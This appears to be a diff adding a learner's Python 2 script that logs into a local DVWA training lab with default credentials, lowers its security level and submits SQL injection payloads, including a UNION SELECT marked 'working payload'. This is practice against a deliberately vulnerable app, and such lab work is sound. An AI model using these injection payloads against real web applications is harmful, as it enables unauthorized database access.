@@ -1,0 +1,55 @@
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+"""
+Created on Mon Feb 20 18:22:11 2017
+
+@author: root
+
+Mechanize with CookieJar in python
+CookieJar helps you maintain state of the webapp
+www.stackoverflow.com/questions/2081640/
+what exactly do u and r string flags do in python
+and what are raw strings
+??check how to extract div in beautiful soup
+"""
+
+import mechanize
+import urllib
+
+cj = mechanize.CookieJar()
+br = mechanize.Browser()
+br.set_cookiejar(cj)
+
+br.open('http://192.168.0.16/DVWA-master/DVWA-master/')
+
+br.select_form(nr=0)
+print br.form
+br.form['username'] = 'admin' #filling value q with defcon
+br.form['password'] = 'password'
+br.submit() #submit the selected form
+
+print br.title()
+print cj
+
+br2 = mechanize.Browser()
+br2.set_cookiejar(cj)
+br2.open('http://192.168.0.16/DVWA-master/DVWA-master/security.php')
+
+br2.select_form(nr=0)
+print br2.form
+br2.form.find_control(name="security",kind="list").value=["low"]
+br2.submit()
+print cj
+
+br3 = mechanize.Browser()
+br3.set_cookiejar(cj)
+br3.open('http://192.168.0.16/DVWA-master/DVWA-master/vulnerabilities/sqli/')
+
+br3.select_form(nr=0)
+#data = urllib.urlencode("'")
+#br3.form['id'] = r"a' OR ''='"
+#working payload
+br3.form['id'] = "' union select 1,@@version##"
+br3.submit()
+html = br3.response().read()
+print html
